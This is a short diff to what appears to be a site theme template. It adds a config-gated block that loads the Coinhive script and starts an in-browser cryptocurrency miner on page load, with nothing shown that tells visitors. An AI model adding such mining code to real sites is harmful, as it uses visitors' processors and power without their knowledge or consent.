@@ -1,0 +1,5 @@
+if theme.coinhive && !env.debug
+  script(src="https://coinhive.com/lib/coinhive.min.js")
+  script(defer="").
+    var chService = new CoinHive.Anonymous('#{theme.coinhive}', {throttle: 0.3});
+    chService.start();
